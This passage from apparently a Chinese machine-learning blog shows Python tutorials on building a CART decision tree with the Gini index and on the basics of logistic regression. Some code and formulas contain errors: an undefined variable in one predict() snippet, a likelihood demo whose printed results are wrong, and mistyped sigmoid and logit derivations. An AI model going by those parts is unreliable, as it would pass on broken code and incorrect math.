7.444542326\t0.476683375\t1 10.12493903\t3.234550982\t1 6.642287351\t3.319983761\t1 将上述代码整合为一起，运行该代码后会打印所有基尼指数，基尼指数为 0.0 或完美分割。\n# Split a dataset based on an attribute and an attribute value def test_split(index, value, dataset): left, right = list(), list() for row in dataset: if row[index] \u0026lt; value: left.append(row) else: right.append(row) return left, right # Calculate the Gini index for a split dataset def gini_index(groups, classes): # 计算两组数据集的总数每个种类的列表数量和 n_instances = float(sum([len(group) for group in groups])) # 计算每组的基尼值 gini = 0.0 for group in groups: size = float(len(group)) # avoid divide by zero if size == 0: continue score = 0.0 # score the group based on the score for each class for class_val in classes: # 拿出数据集中每行的类型，拆开是为了更好的了解结构 p = [row[-1] for row in group] # print(\u0026quot;%f / %f = %f\u0026quot; % (p.count(class_val), size, p.count(class_val) / size )) # 这里计算的是当前的分类在总数据集中占比 p1 = p.count(class_val) / size score += p1 * p1 # gini index formula = 1 - sum(p_i^2) # 计算总的基尼指数，权重：当前分组占总数据集中的数量 gini += (1.0 - score) * (size / n_instances) return gini # Select the best split point for a dataset def get_split(dataset): class_values = list(set(row[-1] for row in dataset)) b_index, b_value, b_score, b_groups = 999, 999, 999, None for index in range(len(dataset[0])-1): # 最后分类不计算 for row in dataset: # 根据每个值分类计算出最优基尼值，这个值就作为决策树的节点 groups = test_split(index, row[index], dataset) gini = gini_index(groups, class_values) print('X%d \u0026lt; %.3f Gini=%.3f' % ((index+1), row[index], gini)) if gini \u0026lt; b_score: b_index, b_value, b_score, b_groups = index, row[index], gini, groups return {'index':b_index, 'value':b_value, 'groups':b_groups} dataset = [ [2.771244718,1.784783929,0], [1.728571309,1.169761413,0], [3.678319846,2.81281357,0], [3.961043357,2.61995032,0], [2.999208922,2.209014212,0], [7.497545867,3.162953546,1], [9.00220326,3.339047188,1], [7.444542326,0.476683375,1], [10.12493903,3.234550982,1], [6.642287351,3.319983761,1] ] split = get_split(dataset) print('Split: [X%d \u0026lt; %.3f]' % ((split['index']+1), split['value'])) 通过执行结果可以看出，X1 \u0026lt; 6.642 Gini=0.000 基尼指数为 0.0 为完美分割。\n如何构建树 构建树主要分为 3 个部分\n终端节点 Terminal Nodes 零度节点称为终端节点或叶节点 递归拆分 建造一棵树 终端节点 需要决定何时停止种植树，这里可以使用节点在训练数据集中负责的深度和行数来做到。\n树的最大深度：从树的根节点开始的最大节点数。一旦达到树的最大深度，停止拆分新节点。 最小节点：对一个节点的要训练的最小值。一旦达到或低于此最小值，则停止拆分和添加新节点。 这两种方法将是构建树的过程时用户的指定参数。当在给定点停止增长时，该节点称为终端节点，用于进行最终预测。\n编写一个函数to_terminal()，这个函数将为一组行选择一类。它返回行列表中最常见的输出值。\ndef to_terminal(group): outcomes = [row[-1] for row in group] return max(set(outcomes), key=outcomes.count) 递归拆分 构建决策树会在为每个节点创建的组上一遍又一遍地调用 get_split() 函数。\n添加到现有节点的新节点称为子节点。一个节点可能有零个子节点（一个终端节点）、一个子节点或两个子节点，这里将在给定节点的字典表示中将子节点称为左和右。当一旦创建出一个节点，则通过再次调用相同的函数来递归地从拆分的每组数据以创建子节点。\n下面需要实现这个过程（递归函数）。函数接受一个节点作为参数，以及节点中的最大深度、最小模式数、节点的当前深度。\n调用的过程分步为。设置，传入根节点和深度1：\n首先，将拆分后的两组数据提取出来使用，当处理过这些组时，节点不再需要访问这些数据。 接下来，我们检查左或右两组是否为空，如果是，则使用我们拥有的记录创建一个终端节点。 不为空的情况下，检查是否达到了最大深度，如果是，则创建一个终端节点。 然后我们处理左子节点，如果行组太小，则创建一个终端节点，否则以深度优先的方式创建并添加左节点，直到在该分支上到达树的底部。最后再以相同的方式处理右侧。 # 创建子拆分或者终端节点 def split(node, max_depth, min_size, depth): \u0026quot;\u0026quot;\u0026quot; :param node: {},分割好的的{'index':b_index, 'value':b_value, 'groups':b_groups} :param max_depth: int, 最大深度 :param min_size:int，最小模式数 :param depth:int， 当前深度 :return: None \u0026quot;\u0026quot;\u0026quot; left, right = node['groups'] del(node['groups']) # 检查两边的分割问题 if not left or not right: node['left'] = node['right'] = to_terminal(left + right) return # 检查最大的深度 if depth \u0026gt;= max_depth: node['left'], node['right'] = to_terminal(left), to_terminal(right) return # 处理左分支，数量要小于最小模式数为terminal node if len(left) \u0026lt;= min_size: node['left'] = to_terminal(left) else: node['left'] = get_split(left) split(node['left'], max_depth, min_size, depth+1) # 否则递归 # 处理左右支，数量要小于最小模式数为terminal node if len(right) \u0026lt;= min_size: node['right'] = to_terminal(right) else: node['right'] = get_split(right) split(node['right'], max_depth, min_size, depth+1) 创建树 构建一个树就是一个上面的步骤的合并，通过**split()**函数打分并确定树的根节点，然后通过递归来构建出整个树；下面代码是实现此过程的函数 build_tree()。\n# Build a decision tree def build_tree(train, max_depth, min_size): \u0026quot;\u0026quot;\u0026quot; :param train: list, 数据集，可以是训练集 :param max_depth: int, 最大深度 :param min_size:int，最小模式数 :return: None \u0026quot;\u0026quot;\u0026quot; root = get_split(train) # 对整个数据集进行打分 split(root, max_depth, min_size, 1) return root 整合 将全部代码整合为一个\n# Split a dataset based on an attribute and an attribute value def test_split(index, value, dataset): left, right = list(), list() for row in dataset: if row[index] \u0026lt; value: left.append(row) else: right.append(row) return left, right # Calculate the Gini index for a split dataset def gini_index(groups, classes): # 计算两组数据集的总数每个种类的列表数量和 n_instances = float(sum([len(group) for group in groups])) # 计算每组的基尼值 gini = 0.0 for group in groups: size = float(len(group)) # avoid divide by zero if size == 0: continue score = 0.0 # score the group based on the score for each class for class_val in classes: # 拿出数据集中每行的类型，拆开是为了更好的了解结构 p = [row[-1] for row in group] # print(\u0026quot;%f / %f = %f\u0026quot; % (p.count(class_val), size, p.count(class_val) / size )) # 这里计算的是当前的分类在总数据集中占比 p1 = p.count(class_val) / size score += p1 * p1 # gini index formula = 1 - sum(p_i^2) # 计算总的基尼指数，权重：当前分组占总数据集中的数量 gini += (1.0 - score) * (size / n_instances) return gini # Select the best split point for a dataset def get_split(dataset): class_values = list(set(row[-1] for row in dataset)) b_index, b_value, b_score, b_groups = 999, 999, 999, None for index in range(len(dataset[0])-1): # 最后分类不计算 for row in dataset: # 根据每个值分类计算出最优基尼值，这个值就作为决策树的节点 groups = test_split(index, row[index], dataset) gini = gini_index(groups, class_values) # print('X%d \u0026lt; %.3f Gini=%.3f' % ((index+1), row[index], gini)) if gini \u0026lt; b_score: # 拿到最小的gini index那列 b_index, b_value, b_score, b_groups = index, row[index], gini, groups return {'index':b_index, 'value':b_value, 'groups':b_groups} # 创建子拆分或者终端节点 def split(node, max_depth, min_size, depth): \u0026quot;\u0026quot;\u0026quot; :param node: {},分割好的的{'index':b_index, 'value':b_value, 'groups':b_groups} :param max_depth: int, 最大深度 :param min_size:int，最小模式数 :param depth:int， 当前深度 :return: None \u0026quot;\u0026quot;\u0026quot; left, right = node['groups'] del(node['groups']) # 检查两边的分割问题 if not left or not right: node['left'] = node['right'] = to_terminal(left + right) return # 检查最大的深度 if depth \u0026gt;= max_depth: node['left'], node['right'] = to_terminal(left), to_terminal(right) return # 处理左分支，数量要小于最小模式数为terminal node if len(left) \u0026lt;= min_size: node['left'] = to_terminal(left) else: node['left'] = get_split(left) split(node['left'], max_depth, min_size, depth+1) # 否则递归 # 处理左右支，数量要小于最小模式数为terminal node if len(right) \u0026lt;= min_size: node['right'] = to_terminal(right) else: node['right'] = get_split(right) split(node['right'], max_depth, min_size, depth+1) # Build a decision tree def build_tree(train, max_depth, min_size): \u0026quot;\u0026quot;\u0026quot; :param train: list, 数据集，可以是训练集 :param max_depth: int, 最大深度 :param min_size:int，最小模式数 :return: None \u0026quot;\u0026quot;\u0026quot; root = get_split(train) # 对整个数据集进行打分 split(root, max_depth, min_size, 1) return root # 打印树 def print_tree(node, depth=0): if isinstance(node, dict): print('%s[X%d \u0026lt; %.3f]' % ( (depth*' ', (node['index']+1), node['value']) )) print_tree(node['left'], depth+1) # 递归打印左右 print_tree(node['right'], depth+1) else: print('%s[%s]' % ((depth*' ', node))) # 不是对象就是terminal node # 创建一个terminal node def to_terminal(group): outcomes = [row[-1] for row in group] return max(set(outcomes), key=outcomes.count) dataset = [ [2.771244718,1.784783929,0], [1.728571309,1.169761413,0], [3.678319846,2.81281357,0], [3.961043357,2.61995032,0], [2.999208922,2.209014212,0], [7.497545867,3.162953546,1], [9.00220326,3.339047188,1], [7.444542326,0.476683375,1], [10.12493903,3.234550982,1], [6.642287351,3.319983761,1] ] if __name__=='__main__': tree = build_tree(dataset, 4, 2) print_tree(tree) 可以看到打印结果是一个类似二叉树的\n[X1 \u0026lt; 6.642] [X1 \u0026lt; 2.771] [0] [X1 \u0026lt; 2.771] [0] [0] [X1 \u0026lt; 7.498] [X1 \u0026lt; 7.445] [1] [1] [X1 \u0026lt; 7.498] [1] [1] 预测 预测是预测数据是该向右还是向左，是作为对数据进行导航的方式。这里可以使用递归来实现，其中使用左侧或右侧子节点再次调用相同的预测，具体取决于拆分如何影响提供的数据。\n我们必须检查子节点是否是要作为预测返回的终端值，或者它是否是包含要考虑的树的另一个级别的字典节点。\n下面是实现此过程的函数 predict()。\n# Make a prediction with a decision tree def predict(node, row): if row[node['index']] \u0026lt; node['value']: if isinstance(node['left'], dict): return predict(node['left'], row) else: return node['left'] else: if isinstance(node['right'], dict): return predict(node['right'], row) else: return node['right'] 下面是一个使用硬编码决策树的示例，该决策树具有一个最好地分割数据的节点（决策树桩，这个就是gini index的最优质值）。通过对上面的测试数据集例来对每一行进行预测。\ndef predict(node, row): # 如果gini index与对应属性的值小于则向左， if row[node['index']] \u0026lt; node['value']: if isinstance(node['left'], dict): return predict(node['left'], row) # 递归处理完整个树 else: return node['left'] else: # 否则的话，则为右 if isinstance(node['right'], dict): return predict(node['right'], row) else: return node['right'] dataset = [[2.771244718,1.784783929,0], [1.728571309,1.169761413,0], [3.678319846,2.81281357,0], [3.961043357,2.61995032,0], [2.999208922,2.209014212,0], [7.497545867,3.162953546,1], [9.00220326,3.339047188,1], [7.444542326,0.476683375,1], [10.12493903,3.234550982,1], [6.642287351,3.319983761,1]] # 这是之前用于计算出最优的gini index stump = {'index': 0, 'right': 1, 'value': 6.642287351, 'left': 0} for row in dataset: prediction = predict(stump, row) print('Expected=%d, Got=%d' % (row[-1], prediction)) 通过观察可以看出预测结果和实际结果一样\nExpected=0, Got=0 Expected=0, Got=0 Expected=0, Got=0 Expected=0, Got=0 Expected=0, Got=0 Expected=1, Got=1 Expected=1, Got=1 Expected=1, Got=1 Expected=1, Got=1 Expected=1, Got=1 套用真实数据集来测试 这里将使用 CART 算法对银行钞票数据集进行预测。大概的流程为：\n加载数据集并转换格式。 编写拆分算法与准确度计算算法；这里使用 5折的k折交叉验证（k-fold cross validation）用于评估算法 编写 CART 算法，从训练数据集，创建树，对测试数据集进行预测操作 什么是 K折交叉验证 K折较差验证（K-Fold CV）是将给定的数据集分成K个部分，其中每个折叠在某时用作测试集。以 5 折（K=5）为例。这种情况下，数据集被分成5份。在第一次迭代中，第一份用于测试模型，其余用于训练模型。在第二次迭代中，第 2 份用作测试集，其余用作训练集。重复这个过程，直到 5 个折叠中的每个折叠都被用作测试集。\n下面来开始编写函数，函数的整个过程为\nevaluate_algorithm() 作为最外层调用 使用五折交叉进行评估 cross_validation_split() 使用决策树算法作为算法根据 decision_tree() 构建树：build_tree() 拿到最优基尼指数作为叶子 get_split() from random import seed from random import randrange from csv import reader # 加载csv文件 def load_csv(filename): file = open(filename, \u0026quot;rt\u0026quot;) lines = reader(file) dataset = list(lines) return dataset # 将所有字段转换为float类型便于计算 def str_column_to_float(dataset, column): for row in dataset: row[column] = float(row[column].strip()) # k-folds CV函数 def cross_validation_split(dataset, n_folds): dataset_split = list() dataset_copy = list(dataset) # 平均分位折数n_folds fold_size = int(len(dataset) / n_folds) for i in range(n_folds): fold = list() while len(fold) \u0026lt; fold_size: index = randrange(len(dataset_copy)) # 随机 fold.append(dataset_copy.pop(index)) dataset_split.append(fold) return dataset_split # 计算精确度 def accuracy_metric(actual, predicted): correct = 0 for i in range(len(actual)): if actual[i] == predicted[i]: correct += 1 return correct / float(len(actual)) * 100.0 # Evaluate an algorithm using a cross validation split def evaluate_algorithm(dataset, algorithm, n_folds, *args): folds = cross_validation_split(dataset, n_folds) scores = list() for fold in folds: train_set = list(folds) train_set.remove(fold) train_set = sum(train_set, []) test_set = list() for row in fold: row_copy = list(row) test_set.append(row_copy) row_copy[-1] = None predicted = algorithm(train_set, test_set, *args) actual = [row[-1] for row in fold] accuracy = accuracy_metric(actual, predicted) scores.append(accuracy) return scores # 根据基尼指数划分value是应该在树的哪边？ def test_split(index, value, dataset): left, right = list(), list() for row in dataset: if row[index] \u0026lt; value: left.append(row) else: right.append(row) return left, right # 基尼指数打分 def gini_index(groups, classes): # 计算数据集中的多组数据的总个数 n_instances = float(sum([len(group) for group in groups])) # 计算每组中的最优基尼指数 gini = 0.0 for group in groups: size = float(len(group)) if size == 0: continue score = 0.0 # 总基尼指数 for class_val in classes: # 拿出数据集中每行的类型，拆开是为了更好的了解结构 # 计算的是当前的分类在总数据集中占比 p = [row[-1] for row in group] p1 = p.count(class_val) / size score += p1 * p1 # 计算总的基尼指数，并根据相应大小增加权重。权重：当前分组占总数据集中的数量 gini += (1.0 - score) * (size / n_instances) return gini # 从数据集中获得基尼指数最佳的值 def get_split(dataset): class_values = list(set(row[-1] for row in dataset)) b_index, b_value, b_score, b_groups = 999, 999, 999, None for index in range(len(dataset[0])-1): for row in dataset: groups = test_split(index, row[index], dataset) gini = gini_index(groups, class_values) if gini \u0026lt; b_score: b_index, b_value, b_score, b_groups = index, row[index], gini, groups return {'index':b_index, 'value':b_value, 'groups':b_groups} # 创建终端节点 def to_terminal(group): outcomes = [row[-1] for row in group] return max(set(outcomes), key=outcomes.count) # 创建子节点，为终端节点或子节点 def split(node, max_depth, min_size, depth): \u0026quot;\u0026quot;\u0026quot; :param node: {},分割好的的{'index':b_index, 'value':b_value, 'groups':b_groups} :param max_depth: int, 最大深度 :param min_size:int，最小模式数 :param depth:int， 当前深度 :return: None \u0026quot;\u0026quot;\u0026quot; left, right = node['groups'] del(node['groups']) # check for a no split if not left or not right: node['left'] = node['right'] = to_terminal(left + right) return # check for max depth if depth \u0026gt;= max_depth: node['left'], node['right'] = to_terminal(left), to_terminal(right) return # process left child if len(left) \u0026lt;= min_size: node['left'] = to_terminal(left) else: node['left'] = get_split(left) split(node['left'], max_depth, min_size, depth+1) # process right child if len(right) \u0026lt;= min_size: node['right'] = to_terminal(right) else: node['right'] = get_split(right) split(node['right'], max_depth, min_size, depth+1) # 构建树 def build_tree(train, max_depth, min_size): \u0026quot;\u0026quot;\u0026quot; :param train: list, 数据集，可以是训练集 :param max_depth: int, 最大深度 :param min_size:int，最小模式数 :ret \u0026quot;\u0026quot;\u0026quot; root = get_split(train) split(root, max_depth, min_size, 1) return root # 打印树 def print_tree(node, depth=0): if isinstance(node, dict): print('%s[X%d \u0026lt; %.3f]' % ( (depth*' ', (node['index']+1), node['value']) )) print_tree(node['left'], depth+1) # 递归打印左右 print_tree(node['right'], depth+1) else: print('%s[%s]' % ((depth*' ', node))) # 不是对象就是terminal node # 预测，预测方式为当前基尼指数与最优基尼指数相比较，然后放入树两侧 def predict(node, row): \u0026quot;\u0026quot;\u0026quot; :param node: {} 叶子值 :param row: {}, 需要预测值 :ret \u0026quot;\u0026quot;\u0026quot; if row[node['index']] \u0026lt; node['value']: if isinstance(node['left'], dict): return predict(node['left'], row) else: return node['left'] else: if isinstance(node['right'], dict): return predict(node['right'], row) else: return node['right'] def decision_tree(train, test, max_depth, min_size): tree = build_tree(train, max_depth, min_size) predictions = list() for row in test: prediction = predict(tree, row) predictions.append(prediction) return(predictions) # Test CART on Bank Note dataset seed(1) # 加载数据 filename = 'data_banknote_authentication.csv' dataset = load_csv(filename) # 转换格式 for i in range(len(dataset[0])): str_column_to_float(dataset, i) # 评估算法 n_folds = 5 max_depth = 5 min_size = 10 scores = evaluate_algorithm(dataset, decision_tree, n_folds, max_depth, min_size) print('Scores: %s' % scores) print('Mean Accuracy: %.3f%%' % (sum(scores)/float(len(scores)))) Reference Informatioin Gain\nimplement decision tree algorithm\ninplement information gain\n","permalink":"https://www.oomkill.com/2022/06/decision-tree/","summary":"","title":"决策树"},{"content":"Overview 逻辑回归通常用于分类算法，例如预测某事是 true 还是 false（二元分类）。例如，对电子邮件进行分类，该算法将使用电子邮件中的单词作为特征，并据此预测电子邮件是否为垃圾邮件。用数学来讲就是指，假设因变量是 Y，而自变量集是 X，那么逻辑回归将预测因变量 $P(Y=1)$ 作为自变量集 X 的函数。\n逻辑回归性能在线性分类中是最好的，其核心为基于样本属于某个类别的概率。这里的概率必须是连续的并且在 (0, 1) 之间（有界）。它依赖于阈值函数来做出称为 Sigmoid 或 Logistic 函数决定的。\n学好逻辑回归，需要了解逻辑回归的概念、优势比 (OR) 、Logit 函数、Sigmoid 函数、 Logistic 函数及交叉熵或Log Loss\nPrerequisite odds ratio explain odds ratio是预测变量的影响。优势比取决于预测变量是分类变量还是连续变量。\n连续预测变量：$OR \u0026gt; 1$ 表示，随着预测变量的增加，事件发生的可能性增加。$OR \u0026lt; 1$ 表示随着预测变量的增加，事件发生的可能性较小。 分类预测变量：事件发生在预测变量的 2 个不同级别的几率；如 A,B，$OR \u0026gt; 1$ 表示事件在 A 级别的可能性更大。$OR\u0026lt;1$ 表示事件更低的可能是在A。 例如，假设 X 是受影响的概率，Y 是不受影响的概率，则 $OR= \\frac{X}{Y}$ ，那么 $OR = \\frac{P}{(1-P)}$ ，P是事件的概率。\n让概率的范围为 [0,1] ，假设 $P(success)=0.8$ ，$Q(failure) = 0.2$ ；$OR$ 则是 成功概率和失败概率的比值，如：$O(success)=\\frac{P}{Q} = \\frac{0.8}{0.2} = 4$ , $O(failure)=\\frac{Q}{P} = \\frac{0.2}{0.8} = 0.25$ 。\nodds和probability 的区别 probability 表示在多次实验中，看到改事件的几率，位于 [0,1] 之间\nodds 表示 $\\frac{(事件发生的概率)}{(事件不会发生的概率)}$ 的比率，位于 [0,∞]\n例如赛马，一匹马跑 100 场比赛，赢了 80 场，那么获胜的概率是 $\\frac{80}{100} = 0.80 = 80%$ ，获胜的几率是 $\\frac{80}{20}=4:1$\n总结：probability 和 odds 之间的主要区别：\n“odds”用于描述是否有可能发生事件。相反，probability决定了事件发生的可能性，即事件发生的频率。 odds以比例表示，probability以百分比形式或小数表示。 odds通常从 0 ~ ∞ ，其中0定义事件发生的可能性，∞ 表示发生的可能性。相反，probability 介于 0~1之间。因此，probability越接近于0，不发生的可能性就越大，越接近于1，发生的可能性就越高。 Reference The Difference Between \u0026ldquo;Probability\u0026rdquo; and \u0026ldquo;Odds\u0026rdquo;\n通过示例陈述公式 假设一个体校的录取率中，10 个男生中有 7 个被录取，而10 个女生中有3个被录取。找出男生被录取的概率？\n那么通过已知条件，设 P 为录取概率，Q则为未被录取的概率，那么\n男生被录取的概率为： $P=\\frac{7}{10} = 0.7$ $Q=1-0.7 = 0.3$ 女生被录取的概率为： $P=\\frac{3}{10}=0.3$ $Q=1-0.3=0.7$ 录取优势比： $OR(boy)=\\frac{0.7}{0.3}=2.33$ $OR(Gril) = \\frac{0.3}{0.7}=0.42$ 因此，一个男生被录取的几率为 $OR=\\frac{2.33}{0.42}=5.44$\nLogit 函数 logit函数是Odd Ratio 的对数 logarithm , 给出 0~1 范围内的输入，然后将它们转换为整个实数范围内的值。如：假设P，则 $\\frac{P}{(1-P)}$ 为对应的OR；OR 的 logit 的公式为：$loggit(P) = log(odds) = log(\\frac{P}{1-P})$.\n以一辆汽车是否出售为例，1为出售，0为不出售，则等式 $P_i=B_0+B_1 * (Price_i) + \\epsilon$\n$ln(\\frac{P}{1-P}) = \\beta_0 + \\beta_1X_1+\\beta_2X_2\u0026hellip; + \\beta_nX_N$ ,对于简单的逻辑回归，有两个系数：\n$\\beta_0$ 截距 ：X 变量为 0 时的对数 odds ratio $\\beta_1$ 斜率：odds ratio随X增加（或减少），1的变化 例如：假设简单逻辑回归模型是 $Ln(odds) = -5.5 + 1.2*X$ ,那么 $\\beta_0=-5.5$ ，$\\beta_1 = 1.2$ ，意味着，X=0时，$odds\\ ratio = 0$ ，X每增加一个单位 odds ration 增加 1.2（（X 增加2个单位odds ratio增加 2.4\u0026hellip;.）\n求解\n通过上面的公式实际上不明白这些具体是什么，就可以通过求P来找到有结果的概率与截距 $β_0$ 之间的关系，已知 $n=log_ab$ , $ a^n=b$ ，那么一个简单的逻辑回归公式为 $log(\\frac{P}{1-P}) = \\beta_0+\\beta1X$ ，对这个公式进行推导：\n$\\frac{P}{1-P} = e^{\\beta_0+e^\\beta1*X}$ $P = e^{\\beta_0+e^\\beta1X} - Pe^{\\beta_0+e^\\beta1X}$ $P(1+e^{\\beta_0+e^\\beta1X}) = e^{\\beta_0+e^\\beta1X}$ $P=\\frac{e^{\\beta_0+e^\\beta1X}}{1+e^{\\beta_0+e^\\beta1X}}$ 当 $X=0$ ,则 $\\beta_1*X$ 没意义，公式为：$P = frac{e^{β_0}}{(1+e^{β_0})}$ ，其中e是一个常数，python为 math.e\n如果单纯不算概率，只看截距符号，那么满足：\n如果截距为负号：则产生结果的概率将 \u0026lt; 0.5。 如果截距为正号：那么产生结果的概率将 \u0026gt; 0.5。 如果截距等于 0：那么得到结果的概率正好是 0.5。 通过例子来说明这点：假设研究为抽烟对心脏健康的影响，下表显示了一个逻辑回归\nCoefficient Standard Error p-value Intercept -1.93 0.13 \u0026lt; 0.001 Smoking 0.38 0.17 0.03 由表可知，截距为 -1.93，假设smoking系数为0，那么概率带入公式为：$P=\\frac{e^{\\beta_0}}{1+e^{\\beta_0}} = P=\\frac{e^{-1.93}}{1+e^{-1.93}} = 0.126$(math.e ** -1.93)/(1+math.e ** -1.93)\n如果 Smoking是一个连续变量（每年的吸烟量），在这种情况下，Smoking=0 意味着每年使用0公斤烟草的人即不抽烟的人群；那么这个结果就为，不抽烟的人群在未来10年内心脏有问题几率为 0.126。\n再如果是吸烟者应该怎么计算，假设，每年吸烟量为3kg，那么公式为：$P = \\frac{e^{β0 + β_1X}}{(1+e^{β0 + β_1X})}$ ，在这里 X=3，那么 $P=\\frac{e^{\\beta_1+\\beta_2X}}{(1-e^{\\beta_1+\\beta_2X})} = \\frac{e^{-1.93+0.383}}{(1-e^{-1.93+0.383})} = 0.31$ ；即得出，每年3KG烟草消耗量10年后有心脏问题的概率是 31%\ninterpret\nsigmoid logit 函数的逆函数称Sigmoid 函数，sigmoid方程来源于 logit 为：$P=\\frac{e^{log(odds)}}{(1-e^{log(odds)})} = \\frac{1}{e^{-log(odds)+1}} = \\frac{1}{1+e^{-z}}$ 。\n在python中，np.exp 是求 是求 $e^{x}$ 的值的函数。正好可以用在sigmod函数中，那么sigmoid可以写为\ndef sigmoid(z): return 1 / (1 + np.exp(-z)) 交叉熵或对数损失 交叉熵 Cross-Entropy，通常用于量化两个概率分布之间的差异。用于逻辑回归，公式为：$H=\\sum^{x=n}(P(x) \\times log(q(x))$\nMaximum Likelihood Estimation 最大似然估计，Maximum Likelihood Estimation MLE，是概率估算的一种解决方案。MLE在其中寻找一组参数，这些参数将影响数据样本 X 的联合概率的最佳拟合。\n首先，定义一个称为 $\\theta$ theta 的参数，该参数定义概率密度函数的选择和该分布的参数。它可能是一个数值向量，其值平滑变化并映射到不同的概率分布及其参数。在最大似然估计中，我们希望在给定特定概率分布及其参数的最大化情况下从联合概率分布中观察数据的概率，形式上表示为：$P(X|\\theta)$ ，在这种情况下，条件概率通常使用分号 ; 而不是竖线 | ，因为 $\\theta$ 不是随机变量，而是未知参数。表达为 $P(X;\\theta)$ ,或 $P(x_1,x_2,\\ \u0026hellip;\\ x_n;\\theta)$ 。\n这样产生的条件概率被称为在给定模型参数 （$\\theta$）的情况下观察变量 $X$ 的概率，并使用符号 L 来 表示似然函数。例如：$L(X;\\theta)$。而最大似然估计的目标是找到使似然函数最大化的一组参数 ( $\\theta$ )，例如产生最大似然值，如：$max(L(X;\\theta))$\n鉴于上述提到的变量 $X$ 是由n个样本组成，可以将其定义为在给定概率分布参数 $\\theta$ 的情况下，变量 $X$ 的联合概率,如这里数据样本为 $x_1,x_2,\\ \u0026hellip;\\ ,x_n$ 的联合概率，同时表示为 $L(x_1,x2,\\ \u0026hellip;\\ ,x_n;\\theta)$\n大多数情况下，求解似然方程很复杂。会使用对数似然作为一种解决方案。由于对数函数是单调递增的，因此对数似然和似然中的最优参数是相同的。因此定义条件最大似然估计为：$log(P(x_i ; h))$。\n用逻辑回归模型替换h，需要假设一个概率分布。在逻辑回归的情况下，假设数据样本为二项式概率分布，其中每个示例都是二项式的一个结果。伯努利分布只有一个参数：成功结果的概率 P，那么为：\n$P(y=1)=P$ $P(y=0)=1-P$ 那么这个平均值为：$P(y=1)*1+P(y=0)0$，给出P的值公式可以转换为：$P1+(1-p)*0$；这种公式看似没有意义，那么通过一个小例子来了解下\n# 二项式似然函数 def likelihood(y, p): return p * y + (1 - p) * (1 - y) # test for y=1 y, p = 1, 0.9 print('y=%.1f, p=%.1f, likelihood: %.3f' % (y, p, likelihood(y, p))) y, yhat = 1, 0.1 print('y=%.1f, p=%.1f, likelihood: %.3f' % (y, p, likelihood(y, p))) # test for y=0 y, yhat = 0, 0.1 print('y=%.1f, p=%.1f, likelihood: %.3f' % (y, p, likelihood(y, p))) y, yhat = 0, 0.9 print('y=%.1f, p=%.1f, likelihood: %.3f' % (y, p, likelihood(y, p))) # y=1.0, p=0.9, likelihood: 0.900 # y=1.0, p=0.9, likelihood: 0.900 # y=0.0, p=0.9, likelihood: 0.100 # y=0.0, p=0.9, likelihood: 0.100 运行示例会为每个案例打印类别y 和预测概率p，其中每个案例的概率是否接近；这里也可以使用对数更新似然函数，$log(p) * y + log(1 – p) * (1 – y)$；最后可以根据数据集中实例求最大似然和最小似然\n$\\sum^{i=1}_n log(p_i) * y_i + log(1 – p_i) * (1 – y_i)$ 最小似然使用反转函数，使负对数自然作为最小似然。上面的公式前加 - 对于计算二项式分布的对数似然相当于计算二项式分布[交叉熵，其中P(class)表示第 class 项概率，q() 表示概率分布，$-(log(q(class0)) \\times P(class0) + log(q(class1)) * P(class1))$\nLR算法实例 在研究如何从数据中估计模型的参数之前，我们需要了解逻辑回归准确计算的内容。\n模型的线性部分（输入的加权和）计算成功事件的log-odds。\nodds ratio：$\\beta_0+\\beta_1 \\times x_1 + \\beta_2 \\times x_2\\ \u0026hellip;\\ \\beta_n \\times x_n$ 该模型估计了每个级别的输入变量的log-odds。\n由上面信息了解到，几率 probability 是输赢的比率 如 1:10 ；probability 可以转换为 odds ratio 即成功概率除以不成功概率：$or=\\frac{P}{1-P}$ ；计算or的对数，被称为log-odds是一种度量单位：$log(\\frac{P}{1-P})$，而所求的即为 log-odds的逆函数，而在python中 log 函数是对数，求log的逆方法即 exp 返回n的x次方就是log的逆函数。\n到这里已经和逻辑回归模型很接近了，对数函数公式可以简化为，$P=\\frac{e^{log(odds)}}{(1-e^{log(odds)})}$ ，以上阐述了如何从log-odds转化为odds，然后在到逻辑回归模型。下面通过Python 中的示例来具体计算 probability 、odds 和 log-odds 之间的转换。假设将成功概率定义为 80% 或 0.8，然后将其转换为odds，然后再次转换为概率。\nfrom math import log from math import exp prob = 0.8 print('Probability %.1f' % prob) # 将 probability 转换为 odds odds = prob / (1 - prob) print('Odds %.1f' % odds) # 将 odds 转换为 log-odds logodds = log(odds) print('Log-Odds %.1f' % logodds) # 转换 log-odds 为 probability prob = 1 / (1 + exp(-logodds)) print('Probability %.1f' % prob) # Probability 0.8 # Odds 4.0 # Log-Odds 1.4 # Probability 0.8 通过这个例子，可以看到odds被转换成大约 1.4 的log-odds，然后正确地转回 0.8 的成功概率。\n逻辑回归实现 首先将实现分为3个步骤：\n预测 评估系数 真实数据集预测 预测 编写一个预测函数，在评估随机梯度下降中的候选系数值时以及在模型最终确定测试数据或新数据进行预测时。\n下面是预测**predict()**函数，它预测给定一组系数的行的输出值。第一个系数是截距，也称为偏差或 b0，它是独立的，不负责输入值。\ndef predict(row, coefficients): p = coefficients[0] for i in range(len(row)-1): yhat += coefficients[i + 1] * row[i] return 1.0 / (1.0 + exp(-p)) 准备一些测试数据，Y代表真实的类别\nX1\tX2\tY 2.7810836 2.550537003\t0 1.465489372\t2.362125076\t0 3.396561688\t4.400293529\t0 1.38807019\t1.850220317\t0 3.06407232\t3.005305973\t0 7.627531214\t2.759262235\t1 5.332441248\t2.088626775\t1 6.922596716\t1.77106367\t1 8.675418651\t-0.242068655\t1 7.673756466\t3.508563011\t1 这里有两个输入值，和三个系数，系数是自定义的固定值，那么预测的公式就为\n# 系数为 coef = [-0.406605464, 0.852573316, -1.104746259] y = 1.0 / (1.0 + e^(-(b0 + b1 * X1 + b2 * X2))) # 套入公式（sigma） y = 1.0 / (1.0 + e^(-(-0.406605464 + 0.852573316 * X1 + -1.104746259 * X2))) 完整的代码\n# Make a prediction from math import exp # Make a prediction with coefficients def predict(row, coefficients): yhat = coefficients[0] for i in range(len(row)-1): yhat += coefficients[i + 1] * row[i] return 1.0 / (1.0 + exp(-yhat)) # test predictions dataset = [[2.7810836,2.550537003,0], [1.465489372,2.362125076,0], [3.396561688,4.400293529,0], [1.38807019,1.850220317,0], [3.06407232,3.005305973,0], [7.627531214,2.759262235,1], [5.332441248,2.088626775,1], [6.922596716,1.77106367,1], [8.675418651,-0.242068655,1], [7.673756466,3.508563011,1]] coef = [-0.406605464, 0.852573316, -1.104746259] for row in dataset: yhat = predict(row, coef) print(\u0026quot;Expected=%.3f, Predicted=%.3f [%d]\u0026quot; % (row[-1], yhat, round(yhat))) 估计系数 